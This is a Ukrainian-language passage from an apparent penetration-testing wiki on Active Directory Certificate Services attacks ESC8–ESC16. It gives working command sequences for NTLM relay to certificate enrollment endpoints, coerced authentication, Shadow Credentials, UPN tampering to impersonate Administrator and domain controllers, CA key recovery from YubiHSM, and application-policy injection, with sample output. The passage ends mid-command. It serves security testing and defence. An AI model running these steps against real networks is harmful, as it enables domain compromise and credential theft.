- **Інтерфейс вебреєстрації** (застарілий застосунок ASP, доступний за адресою `http://<caserver>/certsrv/`) за замовчуванням використовує лише HTTP, який не забезпечує захисту від атак NTLM relay. Крім того, в ньому явно дозволено лише автентифікацію NTLM через HTTP-заголовок Authorization, тому безпечніші методи автентифікації, як-от Kerberos, застосувати неможливо.
- **Служба реєстрації сертифікатів** (CES), вебслужба **політики реєстрації сертифікатів** (CEP) і **служба реєстрації мережевих пристроїв** (NDES) за замовчуванням підтримують автентифікацію negotiate через HTTP-заголовок Authorization. Автентифікація negotiate **підтримує і** Kerberos, і **NTLM**, що дає зловмиснику змогу **понизити рівень автентифікації до NTLM** під час атак relay. Хоча ці вебслужби за замовчуванням використовують HTTPS, сам по собі HTTPS **не захищає від атак NTLM relay**. Захист HTTPS-служб від атак NTLM relay можливий лише за умови поєднання HTTPS із прив’язуванням до каналу. На жаль, AD CS не вмикає Extended Protection for Authentication в IIS, необхідний для прив’язування до каналу.<sup>[[6]](#references)</sup>

Поширена **проблема** атак NTLM relay — **коротка тривалість сеансів NTLM** і неможливість зловмисника взаємодіяти зі службами, які **вимагають підписування NTLM**.

Однак це обмеження можна обійти, скориставшись атакою NTLM relay, щоб отримати сертифікат користувача: тривалість сеансу визначатиметься строком дії сертифіката, а сам сертифікат можна використовувати зі службами, які **вимагають підписування NTLM**. Інструкції з використання викраденого сертифіката наведено тут:


{{#ref}}
account-persistence.md
{{#endref}}

Інше обмеження атак NTLM relay полягає в тому, що **обліковий запис жертви має автентифікуватися на машині, контрольованій зловмисником**. Зловмисник може чекати або спробувати **примусово викликати** таку автентифікацію:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Зловживання**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` перелічує **увімкнені HTTP-кінцеві точки AD CS**:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Властивість `msPKI-Enrollment-Servers` використовується корпоративними центрами сертифікації (CA) для зберігання кінцевих точок Certificate Enrollment Service (CES). Ці кінцеві точки можна розібрати та вивести списком за допомогою інструмента **Certutil.exe**:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Зловживання за допомогою Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Зловживання за допомогою [Certipy](https://github.com/ly4k/Certipy)

За замовчуванням Certipy надсилає запит на сертифікат на основі шаблону `Machine` або `User` — залежно від того, чи закінчується ім’я облікового запису, автентифікацію якого ретранслюють, на `$`. Інший шаблон можна вказати за допомогою параметра `-template`.

Потім можна скористатися технікою на кшталт [PetitPotam](https://github.com/ly4k/PetitPotam), щоб примусово ініціювати автентифікацію. Для контролерів домену потрібно вказати `-template DomainController`.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Пояснення

Значення **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) для **`msPKI-Enrollment-Flag`**, відоме як ESC9, вилучає розширення SID `szOID_NTDS_CA_SECURITY_EXT` із сертифіката. Старі приклади ESC9 залежать від поведінки сумісності KDC (`StrongCertificateBindingEnforcement=1`) або окремого маршруту зі слабким зіставленням Schannel. Значення `1` — це **історичний параметр сумісності**, а не поточне значення за замовчуванням: Microsoft повідомляє, що перевизначення KDC перестало підтримуватися з оновленням безпеки Windows від 9 вересня 2025 року. Перш ніж застосовувати старий сценарій, перевірте фактичне оновлення цільової системи та кінцеву точку автентифікації.<sup>[[7]](#references)</sup> Див. [рекомендації Microsoft щодо розгортання](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Умови, за яких параметр цього прапорця має значення:

- На старішому сумісному KDC ефективна політика прив’язки сертифіката дозволяє зіставлення; або кінцева точка Schannel окремо вмикає зіставлення UPN за допомогою біта `0x4` параметра `CertificateMappingMethods`.
- Сертифікат позначений прапорцем `CT_FLAG_NO_SECURITY_EXTENSION` у параметрі `msPKI-Enrollment-Flag`.
- У сертифікаті вказано будь-який EKU для автентифікації клієнта.
- Доступні дозволи `GenericWrite` для будь-якого облікового запису, щоб скомпрометувати інший.

### Сценарій зловживання

Припустімо, що `John@corp.local` має дозволи `GenericWrite` для `Jane@corp.local` і хоче скомпрометувати `Administrator@corp.local`. Шаблон сертифіката `ESC9`, для якого `Jane@corp.local` має право на реєстрацію, налаштований із прапорцем `CT_FLAG_NO_SECURITY_EXTENSION` у параметрі `msPKI-Enrollment-Flag`.

Спочатку хеш `Jane` отримують за допомогою Shadow Credentials завдяки дозволам `GenericWrite` користувача `John`:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Згодом значення `userPrincipalName` облікового запису `Jane` змінюють на `Administrator`, навмисно опускаючи частину домену `@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Ця зміна не порушує обмежень, оскільки `Administrator@corp.local` залишається відмінним від `userPrincipalName` користувача `Administrator`.

Після цього шаблон сертифіката `ESC9`, позначений як вразливий, запитується від імені `Jane`:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

Зазначено, що `userPrincipalName` сертифіката відображає `Administrator`, не містячи жодного SID об’єкта.

Потім `userPrincipalName` Jane повертається до початкового значення — `Jane@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Спроба автентифікації за допомогою виданого сертифіката тепер дає NT-хеш `Administrator@corp.local`. У команді потрібно вказати `-domain <domain>`, оскільки в сертифікаті не зазначено домен:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Слабкі зіставлення сертифікатів - ESC10

### Пояснення

Під ESC10 часто розглядають дві окремі політики зіставлення сертифікатів. Перевіряйте налаштування на кінцевій точці, яка фактично обробляє відповідну автентифікацію:

- Schannel `CertificateMappingMethods` у `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` керує зіставленням клієнтських сертифікатів TLS на сервері застосунку. Біт UPN — `0x4`; у оновлених системах типовим є значення `0x18` (`0x8 | 0x10`).
- Параметр KDC `StrongCertificateBindingEnforcement` у `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` історично керував сумісністю прив’язування сертифікатів Kerberos. Значення `1` не є надійним поточним значенням за замовчуванням, а Microsoft припинила підтримку цього перевизначення з оновленням безпеки Windows від 9 вересня 2025 року. Його стан сам по собі не описує зіставлення UPN у Schannel.<sup>[[7]](#references)</sup>

**Випадок 1**

Історично — коли старіший KDC враховував `StrongCertificateBindingEnforcement=0`; перевірте рівень оновлень, оскільки в поточних системах із встановленими оновленнями це перевизначення більше не підтримується.

**Випадок 2**

Коли на кінцевій точці клієнтських сертифікатів Schannel увімкнено біт UPN (`0x4`) параметра `CertificateMappingMethods`. Це окреме налаштування, не пов’язане з примусовим суворим прив’язуванням KDC; для нього також потрібен сертифікат автентифікації клієнта, доступний для реєстрації, і дієвий контроль над атрибутом зіставленого облікового запису.

### Зловживання, випадок 1

У старому середовищі, де KDC досі враховує `StrongCertificateBindingEnforcement=0`, контроль над `userPrincipalName` облікового запису може бути частиною шляху слабкого зіставлення з іншим обліковим записом. Окремо потрібно перевірити наявність необхідного сертифіката, доступного для реєстрації, зіставлення, цільову ідентичність і успішну автентифікацію; самі лише ACE `GenericWrite` або значення реєстру не підтверджують можливість захоплення облікового запису.

Наприклад, маючи дозволи `GenericWrite` для `Jane@corp.local`, зловмисник прагне скомпрометувати `Administrator@corp.local`. Процедура аналогічна ESC9 і дає змогу використовувати будь-який шаблон сертифіката.

Спочатку отримують хеш `Jane` за допомогою Shadow Credentials, використовуючи `GenericWrite`.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Згодом `userPrincipalName` користувача `Jane` змінюється на `Administrator` без частини `@corp.local`, щоб уникнути порушення обмеження.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Після цього запитується сертифікат, що дає змогу автентифікувати клієнта, від імені `Jane` із використанням шаблону `User` за замовчуванням.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

Атрибут `userPrincipalName` користувачки `Jane` потім повертається до початкового значення `Jane@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Автентифікація за допомогою отриманого сертифіката дасть NT-хеш `Administrator@corp.local`; у команді потрібно вказати домен, оскільки в сертифікаті немає відомостей про нього.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Сценарій зловживання 2

Якщо `CertificateMappingMethods` містить бітовий прапорець `UPN` (`0x4`), обліковий запис A із дозволами `GenericWrite` може скомпрометувати будь-який обліковий запис B, у якого немає властивості `userPrincipalName`, зокрема облікові записи комп’ютерів і вбудований адміністратор домену `Administrator`.

У цьому випадку мета — скомпрометувати `DC$@corp.local`, спершу отримавши хеш `Jane` за допомогою Shadow Credentials, використовуючи `GenericWrite`.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

Після цього `userPrincipalName` для `Jane` встановлюється в значення `DC$@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

Сертифікат для автентифікації клієнта запитується від імені `Jane` із використанням шаблону `User` за замовчуванням.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`userPrincipalName` користувача `Jane` після цього процесу повертається до початкового значення.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Для автентифікації через Schannel використовується параметр `-ldap-shell` Certipy, який свідчить про успішну автентифікацію як `u:CORP\DC$`.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Через LDAP shell команди на кшталт `set_rbcd` дають змогу здійснювати атаки з використанням Resource-Based Constrained Delegation (RBCD), що потенційно дозволяє скомпрометувати контролер домену.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Ця вразливість також стосується будь-якого облікового запису користувача, якому бракує `userPrincipalName` або значення якого не збігається з `sAMAccountName`. Обліковий запис `Administrator@corp.local` є пріоритетною ціллю через підвищені привілеї LDAP і відсутність `userPrincipalName` за замовчуванням.

## Relaying NTLM to ICPR - ESC11

### Пояснення

Якщо на сервері CA не налаштовано `IF_ENFORCEENCRYPTICERTREQUEST`, можна виконувати атаки NTLM relay без підпису через службу RPC. [Посилання тут](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

За допомогою `certipy` можна перевірити, чи вимкнено `Enforce Encryption for Requests`; certipy покаже вразливості `ESC11`.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Сценарій зловживання

Потрібно налаштувати relay-сервер:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Примітка: Для контролерів домену потрібно вказати `-template` у DomainController.

Або за допомогою форку impacket від sploutchy: ([sploutchy's fork of impacket](https://github.com/sploutchy/impacket))

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Shell access до ADCS CA з YubiHSM - ESC12

### Пояснення

Адміністратори можуть налаштувати Certificate Authority для зберігання ключа на зовнішньому пристрої, наприклад «Yubico YubiHSM2».

Якщо USB-пристрій під'єднано до сервера CA через USB-порт або через USB-сервер (якщо сервер CA є віртуальною машиною), для генерації та використання ключів у YubiHSM за допомогою Key Storage Provider потрібен ключ автентифікації (який іноді називають «паролем»).

Цей ключ/пароль зберігається у реєстрі у відкритому вигляді за шляхом `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.

Посилання [тут](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Сценарій зловживання

Якщо приватний ключ CA зберігається на фізичному USB-пристрої, а ви отримали shell access, ключ можна відновити.

Спочатку потрібно отримати сертифікат CA (він є публічним), а потім:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Нарешті скористайтеся командою certutil `-sign`, щоб підробити новий довільний сертифікат за допомогою сертифіката CA та його приватного ключа.

## OID Group Link Abuse - ESC13

### Пояснення

Атрибут `msPKI-Certificate-Policy` дає змогу додати політику видачі до шаблону сертифіката. Об’єкти `msPKI-Enterprise-Oid`, відповідальні за видачу політик, можна знайти в контексті іменування Configuration (CN=OID,CN=Public Key Services,CN=Services) контейнера PKI OID. Політику можна пов’язати з групою AD за допомогою атрибута `msDS-OIDToGroupLink` цього об’єкта. Це дає змогу системі авторизувати користувача, який пред’являє сертифікат, так, ніби він є членом цієї групи. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Іншими словами, якщо користувач має дозвіл на отримання сертифіката, а сертифікат пов’язаний із групою OID, користувач може успадкувати привілеї цієї групи.

Скористайтеся [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1), щоб знайти OIDToGroupLink:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Сценарій зловживання

Знайдіть дозвіл користувача за допомогою `certipy find` або `Certify.exe find /showAllPermissions`.

Якщо `John` має дозвіл на реєстрацію в `VulnerableTemplate`, користувач може успадкувати привілеї групи `VulnerableGroup`.

Йому потрібно лише вказати шаблон — і він отримає сертифікат із правами `OIDToGroupLink`.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Зловживання явним зіставленням сертифікатів — ESC14

### Пояснення

Опис за адресою https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping надзвичайно докладний. Нижче наведено цитату з оригінального тексту.<sup>[[14]](#references)</sup>

ESC14 стосується вразливостей, що виникають через «слабке явне зіставлення сертифікатів», переважно внаслідок неналежного використання або небезпечного налаштування атрибута `altSecurityIdentities` облікових записів користувачів або комп’ютерів Active Directory. Цей багатозначний атрибут дає адміністраторам змогу вручну пов’язувати сертифікати X.509 з обліковим записом AD для автентифікації. Якщо такі явні зіставлення задано, вони можуть перевизначити логіку зіставлення сертифікатів за замовчуванням, яка зазвичай спирається на UPN або DNS-імена в SAN сертифіката чи на SID, вбудований у розширення безпеки `szOID_NTDS_CA_SECURITY_EXT`.

«Слабке» зіставлення виникає, коли рядкове значення в атрибуті `altSecurityIdentities`, що ідентифікує сертифікат, надто загальне, його легко вгадати, воно спирається на неунікальні поля сертифіката або використовує компоненти сертифіката, які легко підробити. Якщо зловмисник може отримати або створити сертифікат, атрибути якого відповідають такому слабко визначеному явному зіставленню привілейованого облікового запису, він може автентифікуватися за допомогою цього сертифіката й видати себе за цей обліковий запис.

Приклади потенційно слабких рядків зіставлення `altSecurityIdentities`:

- Зіставлення лише за поширеним загальним ім’ям (CN) суб’єкта: наприклад, `X509:<S>CN=SomeUser`. Зловмисник може отримати сертифікат із таким CN з менш захищеного джерела.
- Використання надто загальних розрізнювальних імен (DN) видавця або суб’єкта без додаткових уточнень, як-от конкретного серійного номера чи ідентифікатора ключа суб’єкта: наприклад, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Використання інших передбачуваних шаблонів або не криптографічних ідентифікаторів, яким може відповідати сертифікат, який зловмисник може легально отримати або підробити (якщо він скомпрометував CA або знайшов вразливий шаблон, як у ESC1).

Атрибут `altSecurityIdentities` підтримує різні формати зіставлення, зокрема:

- `X509:<I>IssuerDN<S>SubjectDN` (зіставлення за повними DN видавця та суб’єкта)
- `X509:<SKI>SubjectKeyIdentifier` (зіставлення за значенням розширення Subject Key Identifier сертифіката)
- `X509:<SR>SerialNumberBackedByIssuerDN` (зіставлення за серійним номером, неявно уточненим DN видавця) — це не стандартний формат; зазвичай використовується `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (зіставлення за іменем RFC822, зазвичай адресою електронної пошти, з SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (зіставлення за хешем SHA1 необробленого відкритого ключа сертифіката — зазвичай надійний варіант)

Безпека цих зіставлень залежить від ідентифікаторів, які в них використовуються. Microsoft класифікує зіставлення на основі адрес електронної пошти або імен суб’єктів, зокрема `X509:<RFC822>`, як **слабкі**. У режимі Full Enforcement сертифікат без надійного зіставлення відхиляється; оновлення системи безпеки Windows за вересень 2025 року прибрало можливість повернутися до режиму Compatibility. Тому саме лише слабке зіставлення наразі не є надійним способом видати себе за інший обліковий запис. Перш ніж оцінювати сценарій зі слабким зіставленням, перевірте фактичний рівень оновлень контролера домену та поведінку зіставлення сертифікатів. Дозвіл на запис до `altSecurityIdentities` — це окремий напрямок для перевірки: зловмисник із відповідним довіреним сертифікатом може додати **надійне** явне зіставлення, залежно від ефективних дозволів і перевірки сертифіката. Див. [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) та [дослідження ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/).

Також необхідно діагностувати збої автентифікації за допомогою сертифікатів: вимкнений цільовий обліковий запис або прострочений пароль можуть перешкодити входу, навіть якщо сам сертифікат залишається дійсним.

### Сценарій зловживання

ESC14 націлений на **явні зіставлення сертифікатів** в Active Directory (AD), зокрема на атрибут `altSecurityIdentities`. Якщо цей атрибут задано (навмисно або через помилку конфігурації), зловмисники можуть видавати себе за облікові записи, пред’являючи сертифікати, що відповідають зіставленню.

#### Сценарій A: зловмисник може записувати до `altSecurityIdentities`

 **Передумова**: зловмисник має дозвіл на запис до атрибута `altSecurityIdentities` цільового облікового запису або може надати собі такий дозвіл одним із наведених нижче способів для цільового об’єкта AD:  
- Властивість запису `altSecurityIdentities`  
- Властивість запису `Public-Information`  
- Властивість запису (усі)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Власник*.
#### Сценарій B: ціль має слабке зіставлення через X509RFC822 (електронна пошта)

- **Історична/умовна передумова**: ціль має слабке зіставлення X509RFC822 в `altSecurityIdentities`, зловмисник може редагувати атрибут `mail` користувача, якого реєструють, а відповідний шаблон додає цю адресу електронної пошти до сертифіката для автентифікації клієнта без конфліктного прив’язування SID. Для автентифікації також потрібне середовище, яке досі приймає слабке зіставлення; режим Full Enforcement відхиляє сертифікати лише зі слабким зіставленням. Сам по собі доступ на запис до атрибута `mail` — це лише напрямок для перевірки.
#### Сценарій C: ціль має зіставлення X509IssuerSubject

- **Передумова**: ціль має слабке явне зіставлення X509IssuerSubject в `altSecurityIdentities`. Зловмисник може встановити атрибут `cn` або `dNSHostName` облікового запису жертви так, щоб він відповідав суб’єкту зіставлення X509IssuerSubject цілі. Потім зловмисник може зареєструвати сертифікат від імені жертви й використати його для автентифікації як ціль.
#### Сценарій D: ціль має зіставлення лише за X509Subject

- **Передумова**: ціль має слабке явне зіставлення X509SubjectOnly в `altSecurityIdentities`. Зловмисник може встановити атрибут `cn` або `dNSHostName` облікового запису жертви так, щоб він відповідав суб’єкту зіставлення X509SubjectOnly цілі. Потім зловмисник може зареєструвати сертифікат від імені жертви й використати його для автентифікації як ціль.
### конкретні операції
#### Сценарій A

Запросіть сертифікат за шаблоном сертифіката `Machine`

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Збережіть і конвертуйте сертифікат

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 Автентифікуйтеся (за допомогою сертифіката)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Очищення (необов’язково)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

Щоб дізнатися про конкретніші методи атак для різних сценаріїв, дивіться: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Пояснення

У [оригінальному дослідженні ESC15](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) пояснюється, як application policies, передані в запиті для шаблону V1, можуть перевизначити налаштований Extended Key Usage на **невиправленому issuing CA**.<sup>[[15]](#references)</sup> Також потрібен опублікований шаблон, доступний для реєстрації, який дозволяє необхідні властивості subject/request і не має блокувального етапу схвалення або підпису. Самі лише права на реєстрацію не доводять можливість експлуатації. Використання Certificate Request Agent також може залежати від наявності відповідного другого шаблону та обмежень enrollment-agent; перш ніж заявляти про цей шлях, перевірте стан виправлень CA та результат видачі сертифіката.

### Зловживання

У [документації Certipy з підвищення привілеїв](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) наведено докладніші приклади використання.<sup>[[14]](#references)</sup>


Команда `find` у Certipy може допомогти виявити шаблони V1, потенційно вразливі до ESC15, якщо CA не має потрібних виправлень.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Сценарій A: Пряме impersonation через Schannel

**Крок 1: Запросіть сертифікат, додавши політику застосування «Автентифікація клієнта» та UPN цілі.** Зловмисник `attacker@corp.local` націлюється на `administrator@corp.local`, використовуючи шаблон V1 «WebServer» (який дозволяє вказувати subject під час реєстрації).

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: Вразливий шаблон V1 із параметром «Enrollee supplies subject».
- `-application-policies 'Client Authentication'`: Додає OID `1.3.6.1.5.5.7.3.2` до розширення Application Policies у CSR.
- `-upn 'administrator@corp.local'`: Встановлює UPN у SAN для імперсонації.

**Крок 2: Автентифікуйтеся через Schannel (LDAPS), використовуючи отриманий сертифікат.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Сценарій B: Імперсонація PKINIT/Kerberos через зловживання Enrollment Agent

**Крок 1: Запросіть сертифікат на основі шаблону V1 (з параметром "Enrollee supplies subject"), додавши Application Policy "Certificate Request Agent".** Цей сертифікат потрібен зловмиснику (`attacker@corp.local`), щоб отримати можливість діяти як enrollment agent. Для власної ідентичності зловмисника тут не вказується UPN, оскільки мета — отримати можливості агента.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: додає OID `1.3.6.1.4.1.311.20.2.1`.

**Крок 2: Використайте сертифікат «agent», щоб запросити сертифікат від імені цільового привілейованого користувача.** Це крок, подібний до ESC3, у якому сертифікат із кроку 1 використовується як сертифікат «agent».

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Крок 3: Автентифікуйтеся як привілейований користувач за допомогою сертифіката «on-behalf-of».**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## Вимкнене розширення безпеки на CA (глобально)-ESC16

### Пояснення

**ESC16 (підвищення привілеїв через відсутнє розширення szOID_NTDS_CA_SECURITY_EXT)** описує глобальне для CA вимкнення розширення SID **szOID_NTDS_CA_SECURITY_EXT**. Це індикатор конфігурації, а не доказ того, що сертифікат може проходити автентифікацію від імені іншого облікового запису. Для імперсонації також потрібен контроль відповідних атрибутів облікового запису або зіставлення, доступний для запиту шаблон автентифікації клієнта та шлях зіставлення сертифіката, прийнятий фактичним контролером домену або службою. KDC із виправленнями в режимі Full Enforcement відхиляє сертифікати без розширення SID, якщо для них немає іншого надійного зіставлення; наведена нижче процедура Kerberos лише з UPN застосовна до старіших KDC або KDC у режимі сумісності, які досі приймають слабке зіставлення. Див. [рекомендації Microsoft щодо зіставлення сертифікатів і застосування вимог](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Також ознайомтеся з цією статтею, щоб дізнатися більше про принцип роботи: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Зловживання

Наведений нижче історичний приклад Kerberos лише з UPN ґрунтується на [документації Certipy щодо ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Для нього потрібен KDC, який досі приймає результат зі слабким зіставленням; `StrongCertificateBindingEnforcement=1` більше не є підтримуваним способом перевизначення після оновлення безпеки Windows від 9 вересня 2025 року.<sup>[[14]](#references)</sup>

Щоб визначити, чи вразливе середовище Active Directory Certificate Services (AD CS) до **ESC16**

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Крок 1: Зчитати початковий UPN облікового запису жертви (необов’язково — для відновлення).  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Крок 2: Змініть UPN облікового запису жертви на `sAMAccountName` цільового адміністратора.**  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Крок 3: (За потреби) Отримайте облікові дані облікового запису «жертви» (наприклад, через Shadow Credentials).**

```shell
certipy shadow \
